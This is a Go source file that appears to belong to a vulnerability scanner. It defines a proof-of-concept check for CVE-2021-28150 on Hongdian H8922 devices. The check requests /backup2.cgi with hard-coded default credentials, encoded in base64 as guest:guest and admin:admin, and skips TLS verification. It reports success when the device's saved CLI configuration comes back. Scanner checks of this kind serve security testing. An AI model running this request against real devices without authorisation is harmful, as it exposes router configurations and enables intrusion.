package poc

import (
	"crypto/tls"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func (Info *PocInfo) CVE_2021_28150_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = "CVE-2021-28150"
	poc.Info.Target = "hongdian"
	poc.Info.Type = "INFO"
	poc.Info.Name = "Hongdian H8922 3.0.5 devices INFO"
	poc.Info.Level = 3
	poc.Info.Author = "youzai"

	poc.Poc.Proto = "http"

	poc.Config.Customize = true // 设置为自定义poc
	poc.Config.Url = PocCustomize.Config.Url
	poc.Config.Timeout = PocCustomize.Config.Timeout
	poc.Config.User_Agent = PocCustomize.Config.User_Agent
	poc.Config.Proxy = PocCustomize.Config.Proxy
	poc.Config.Proxy_Url = PocCustomize.Config.Proxy_Url

	transport := &http.Transport{
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},           // 取消证书认证
		ResponseHeaderTimeout: time.Second * time.Duration(poc.Config.Timeout), // 设置超时时间
	}

	// 检查是否使用代理
	if poc.Config.Proxy && poc.Config.Proxy_Url != "" {
		urli := url.URL{}
		urlProxy, _ := urli.Parse(poc.Config.Proxy_Url)
		transport.Proxy = http.ProxyURL(urlProxy) // 设置代理
	}

	// 生成http客户端
	cli := &http.Client{
		Transport: transport,
	}

	// 编写自定义检测函数
	poc.Config.Check = func() bool {
		authString := []string{"Basic Z3Vlc3Q6Z3Vlc3Q=", "Basic YWRtaW46YWRtaW4="}
		for _, auth := range authString {
			request, err := http.NewRequest("GET", poc.Config.Url+"/backup2.cgi", nil)
			if err != nil {
				return false
			}
			request.Header.Add("User-Agent", poc.Config.User_Agent)
			request.Header.Add("Authorization", auth)
			if response, err := cli.Do(request); err != nil {
				return false
			} else {
				defer response.Body.Close()
				body, _ := ioutil.ReadAll(response.Body)
				if strings.Contains(string(body), "CLI configuration saved from vty") || strings.Contains(string(body), "service webadmin") {
					return true
				} else {
					continue
				}
			}
		}
		return false
	}

	PocStruct = append(PocStruct, poc)
}
